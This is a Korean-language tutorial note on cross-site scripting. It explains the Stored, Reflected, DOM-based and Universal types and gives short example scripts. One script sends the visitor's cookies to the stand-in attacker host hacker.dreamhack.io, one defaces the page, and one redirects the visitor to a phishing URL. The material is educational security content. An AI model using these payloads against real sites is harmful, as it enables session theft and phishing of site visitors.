# Cross Site Scripting(XSS)
공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행  
예를 들어 웹 페이지에서 XSS 취약점이 존재하면 오리진 권한으로 악성 스크립트 삽입.  
이후 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자가 임의로 삽입한 스크립트가 실행되어 쿠키 및 세션이 탈취될 수 있음.  

## XSS 발생 예시와 종류 
- XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생  
  예) 로그인 시 출력되는 “안녕하세요, OO회원님”과 같은 문구 또는 게시물과 댓글
- 클라이언트는 HTTP 형식으로 웹 서버에 리소스를 요청. 서버로부터 받은 응답, 즉 HTML, CSS, JS 등의 웹 리소스를 시각화하여 이용자에게 보여 줌
  이때, HTML, CSS, JS와 같은 코드가 포함된 게시물을 조회할 경우 이용자는 변조된 페이지를 보거나 스크립트가 실행될 수 있음.  

### XSS 종류와 악성 스크립트가 삽입되는 위치
|종류|설명|
|--|--|
|Stored XSS|XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS|
|Reflected XSS|XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS|
|DOM-based XSS|XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS. Fragment는 서버 요청/응답 에 포함되지 않습니다.|
|Universal XSS|클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP를 우회하는 XSS|

### XSS 스크립트 
- 세션/쿠키가 웹 브라우저에 저장되어 있기 때문에 자바스크립트를 통해 이용자의 권한으로 정보를 조회하거나 변경하는 등의 행위가 가능함.
- 공격자는 자바 스크립트를 통해 이용자에게 보여지는 웹페이지를 조작하거나 웹 브라우저의 위치를 임의의 주소로 변경할 수 있음.

#### 쿠키 및 세션 탈취 공격 코드
```html
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

#### 페이지 변조 공격 코드
```html
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

#### 위치 이동 공격 코드
```html
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

### Stored XSS
- 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS
- 대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식  
  게시물은 불특정 다수에세 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력 가짐.  

### Reflected XSS
- 악성 스크립트가 이용자 요청 내에 존재. 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 발생  
- 대표적으로 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식  
  이용자가 게시물을 검색하면 서버에서는 검색 결과를 이용자에게 반환 함.  
  일부 서비스에서는 검색 결과를 응답에 포함하는데, 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS가 발생할 수 있음.  
- Reflected XSS는 Stored XSS와는 다르게 URL과 같은 이용자의 요청에 의해 발생.  
  따라서 공격을 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함.  
  이용자에게 링크를 직접 전달하는 방법은 악성 스크립트 포함 여부를 이용자가 눈치챌 수 있기 때문에 주로 Click Jacking 또는 Open Redirect 등 다른 취약점과 연계하여 사용 함.  
